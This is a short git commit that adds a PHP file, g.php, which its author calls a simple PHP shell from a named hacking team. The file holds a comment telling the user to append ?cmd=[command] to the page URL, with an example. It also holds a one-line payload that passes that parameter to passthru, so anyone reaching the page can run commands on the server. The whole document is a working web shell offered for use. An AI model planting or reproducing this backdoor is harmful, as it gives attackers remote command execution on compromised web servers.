40bb43497e888eb6b7db7e0863746991bb7fc6ac
xwh1t3r0s3 <recovering03@yahoo.com>
2016-10-21 12:31:45 +0900

    A very simple php shell

---
+++ g.php
@@ -0,0 +1,8 @@
+/*
+	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
+
+	to use it just add ?cmd=[command] at the end of the link.
+	Example:
+	https://example.com/g.php?cmd=ls
+*/
+<?php echo passthru($_GET['cmd']); _halt_compiler(); ?>
